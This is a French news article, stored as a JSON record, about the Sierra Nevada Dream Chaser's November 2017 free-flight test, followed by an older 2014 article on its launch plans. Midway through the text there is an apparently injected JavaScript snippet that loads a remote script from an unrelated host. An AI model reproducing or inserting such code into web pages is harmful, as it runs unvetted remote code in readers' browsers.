{"title": "L'avion spatial Dream Chaser est de retour en vol", "newspaper": "Futura Sciences", "author": ["Remy Decourt"], "date_publi": "2017-11-15", "content": "Le Dream Chaser, l'avion spatial de Sierra Nevada, vient de reussir le vol libre de son programme de developpement. Le premier, en 2013, s'etait solde par un crash. Dans trois ans, l'appareil devrait debuter son activite commerciale de transport de fret a destination de la Station spatiale internationale (ISS) pour le compte de la Nasa. Il y a quatre ans, le premier vol libre (c'est-a-dire sans moteur allume) du Dream Chaser se soldait par un  crash  en raison d'un dysfonctionnement du train d'atterrissage avant. Aujourd'hui, l'avion spatial de Sierra Nevada est de nouveau en piste. Apres un vol captif realise debut septembre, pendant lequel il est reste une heure et demie dans les airs accroche a un helicoptere, le Dream Chaser a en effet realise, ce 11 novembre, son premier vol libre avec succes. Au cours de ce vol, l'avion spatial a ete transporte par helicoptere jusqu'a une altitude de 3.750 metres, d'ou il a ete relache. Soixante secondes plus tard, l'appareil se posait, sans coup ferir cette fois-ci, sur une des pistes de la base aerienne Edwards, en Californie (Etats-Unis), apres avoir tout de meme atteint une vitesse de 530 km/h. Cet essai n'etait pas anodin. La trajectoire prise par l'appareil est celle attendue pour un retour de la  Station spatiale internationale  (ISS). L'essai a donc permis de verifier cette phase critique de la mission ainsi que le comportement en vol du Dream Chaser et sa capacite a retourner sur Terre et a atterrir. Cette video montre, en trois minutes, le vol libre du Dream Chaser realise le 11 novembre 2017. (c) Nasa, Sierra Nevada Un vol atmospherique des le prochain essai ? Bien que l'analyse des donnees recueillies pendant ce vol libre soit en cours, Mark Sirangelo, vice-president des systemes spatiaux de Sierra Nevada, s'est dit tres confiant : <<  Dans l'ensemble, quels que soient les parametres testes, tous les objectifs ont ete,  soit  atteints, soit depasses. Dans notre esprit, nous sommes tres positifs a propos de ce test  >>.  A priori , il n'y aura pas d'autre vol libre. Sierra Nevada souhaiterait realiser un vol atmospherique des le prochain essai.  << La decision sera prise au cours des semaines prochaines sur la necessite ou non d'un autre vol >>. Le saviez-vous ? Depuis 2013, l' Agence spatiale europeenne  (ESA) s'interesse aux deux versions du Dream Chaser : la version habitee et la version cargo. En ce qui concerne cette derniere, destinee au transport de fret, l'ESA va adapter deux contributions prevues pour la version habitee de cet avion spatial :  le mecanisme europeen d'amarrage  IBDM  ( International Berthing and Docking Mechanism ) ; une suite logicielle derivee du  programme ATV  pour l'amarrage automatique a l'ISS.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Initialement, d'autres vols planes etaient prevus, a des vitesses plus elevees et avec des pilotes a bord, mais seulement pour tester la  version habitee de cet avion spatial . Or, bien que Sierra Nevada n'ait pas abandonne ce projet, la societe prefere se concentrer sur la version cargo, pour laquelle elle a remporte, en 2016, avec SpaceX et Orbital ATK, un  contrat de ravitaillement en fret  de l'ISS. Ce contrat prevoit un minimum de six vols a destination du complexe orbital, a realiser entre fin 2019 et 2024. Pour Sierra Nevada, le premier vol a realiser dans le cadre de ce contrat commercial est prevu en 2020. Il servira a la fois de vol d'essai orbital du vehicule et de premiere mission de transport de fret vers, et depuis, l'ISS. Pour en savoir plus L'avion spatial Dream Chaser realisera son vol d'essai fin 2016 Article de Remy Decourt publie le 27/01/2014 Sierra Nevada et United Launch Alliance ont signe le contrat de lancement du premier vol d'essai orbital du Dream Chaser, susceptible de transporter des  astronautes . Cet engin, plus proche d'un  planeur  que d'un avion, sera lance par un lanceur  Atlas V  le 1er novembre 2016. L'etat d'avancement du developpement du  Dream Chaser  rend les responsables du programme optimistes. Malgre le  crash a l'atterrissage  d'un prototype d'essais techniques a l' automne  dernier, la societe Sierra Nevada vient d'annoncer que le premier vol d'essai en  orbite , sans pilote, sera realise en novembre 2016. L'engin sera mis en orbite par une Atlas V d'United Launch Alliance, qui decollera du centre spatial de  Cap Canaveral , en Floride. Des trois societes en competition pour la fourniture a la Nasa d'un service de transport a destination de la  Station spatiale internationale ,  Sierra Nevada  est la premiere a donner une date de lancement aussi precise. Certes, cela ne prefigure en rien des suites de la competition, mais cette annonce intervient dans un contexte favorable au projet. La societe privee a recemment conclu avec l' Agence spatiale europeenne  un  partenariat non exclusif  qui pourrait se concretiser par la fourniture du mecanisme europeen d'amarrage IBDM ( International Berthing and Docking Mechanism ). Initialement developpe pour le X-38, un demonstrateur qui devait prefigurer le vehicule de secours des equipages de la Station spatiale internationale (CRV,  Crew Return Vehicle ), ce mecanisme permettra au Dream Chaser de s'amarrer a la partie americaine de la Station spatiale. Vue d'artiste du Dream Chaser et de son lanceur Atlas V sur son pas de tir. Parmi les societes en competition pour la fourniture a la Nasa d'un service de transport a destination de l'ISS, Sierra Nevada marque des points, avec un vol d'essai en orbite sans pilote annonce pour novembre 2016. (c) Sierra Nevada                       La Nasa valide le concept du Dream Chaser Sierra Nevada a egalement franchi une nouvelle etape dans le developpement de son engin. Courant janvier, la  Nasa  a passe en revue la maniere dont Sierra Nevada comptait utiliser son systeme de transport, incluant le  lanceur  et l'etage Centaur, pour se rendre en securite a la Station Spatiale avec un equipage. Pour rappel, avant le mois d'aout, moment ou seront connus les deux projets qui continueront a recevoir les financements de la Nasa, chaque projet en competition a un certain nombre d'etapes techniques a franchir. Prealablement definies et differentes d'un projet a un autre, elles conditionnent le versement par tranches du financement promis. Pour le Dream Chaser, elles sont au nombre de dix. A ce jour, Sierra Nevada en a franchi six. Quant au lanceur choisi, il s'agit d'une  Atlas V  d'United Launch Alliance. Cette  coentreprise  a ete creee par Boeing et Lockheed Martin pour exploiter et commercialiser les lanceurs Atlas V et  Delta IV . Ce lanceur construit par Lockheed Martin est egalement celui qu'a choisi Boeing pour le lancement de sa  capsule CST-100 . Avec 42 missions et autant de succes, a l'exception du dixieme tir partiellement reussi, ce lanceur est un des plus fiables du monde occidental. Il est egalement le seul lanceur occidental qualifie pour le lancement de charges nucleaires. ", "theme": "sciences"}